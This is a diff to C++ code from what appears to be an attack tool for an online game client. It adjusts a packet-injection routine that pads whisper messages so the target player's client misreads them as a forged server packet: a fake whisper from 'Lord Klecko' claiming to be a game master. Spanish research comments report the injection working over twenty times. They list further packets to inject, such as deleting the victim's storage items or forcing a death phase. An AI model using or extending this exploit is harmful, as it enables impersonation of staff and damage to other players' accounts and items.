@@ -135,31 +135,45 @@ void Command::_packet_injection(){
 	/*
 	[INVESTIGACION]
 	Si se pone breakpoint en parse_recv_whisper y se van viendo llegar los paquetes no ocurre el bug.
-	Lo actual funciona, se llama a la función que debe parsear el paquete malicioso, pero luego peta
-	porque el paquete siguiente no es válido.
-	Sin embargo si se quita el paquete siguiente no ocurre el bug. Probar a meter un paquete valido.
+	Lo actual funciona, se llama a la función que debe parsear el paquete malicioso, y no peta luego
+	porque el paquete siguiente es válido.
+	Si se quita el paquete siguiente no ocurre el bug.
 
-	Con un paquete de whisper de longitud 500 después parece que se lo traga.
 	PROBLEMA: no puedo meter nullbytes.
 
 	Probar a meter nullbytes con otros paquetes. Aunque parece demasiado locura.
 
+	La inyección me ha funcionado +20 veces seguidas, aunque es raro. Pero probablemente pueda
+	inyectar varios paquetes. Incluso probablemente pueda inyectarlos seguidos en vez de en diferentes
+	ejecuciones, poniendo otro paquete malicioso en vez del paquete final.
+
 	Paquetes sin nullbytes:
-	whisper
-	TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL)
-	TPacketGCPhase
-	puede que chat
-	puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS), pero no soy capaz de recibirlo
-	HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP
-	puede que TPacketGCShop
-	puede que TPacketGCDuelStart
-	puede que TPacketGCWarp? comprobar en OX
-	TPacketGCGuild
-	TPacketGCChangeSkillGroup
-	TPacketGCNPCPosition puede estar gracioso
-	TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
-	TPacketGCLoverInfo, TPacketGCLovePointUpdate XD
+		whisper: lo que se hace ahora
+		TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL): borrar cosas del almacen
+		TPacketGCPhase: poner PHASE_DEAD, parece que es cuando el player se muere
+		puede que chat
+		puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS), pero no soy capaz de recibirlo
+		HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP: no muy util
+		puede que TPacketGCShop
+		puede que TPacketGCDuelStart
+		puede que TPacketGCWarp? comprobar en OX
+		TPacketGCGuild
+		TPacketGCChangeSkillGroup
+		TPacketGCNPCPosition puede estar gracioso
+		TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
+		TPacketGCLoverInfo, TPacketGCLovePointUpdate XD
 	*/
+
+	// MALICIOUS PACKET
+	// whisper
+	string username = "Lord Klecko";
+	string msg = "ola zoi un gm";
+
+	username += string(25 - username.length(), ' ');
+	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
+	string packet = GC_Whisper(5, username, msg).get_buf();
+
+
 	cout << "Performing packet injection to " << instance->username_dc << endl;
 	int i;
 	char c = '\xE1';
@@ -170,12 +184,6 @@ void Command::_packet_injection(){
 		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, c++) + to_string(i)).get_buf();
 
 	// packet
-	string username = "Lord Klecko";
-	string msg = "ola zoi un gm";
-
-	username += string(25 - username.length(), ' ');
-	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
-	string packet = GC_Whisper(5, username, msg).get_buf();
 	cout << "[MALICIOUS PACKET] " << string_to_hex(packet) << endl;																								   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
 	buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();
 
@@ -183,7 +191,6 @@ void Command::_packet_injection(){
 	c++;
 	i++;
 	buf += CG_Whisper(instance->username_dc, to_string(i) + string(200, c++) + to_string(i)).get_buf();
-	//buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf();
 
 	Packet p(buf);
 	p.send();
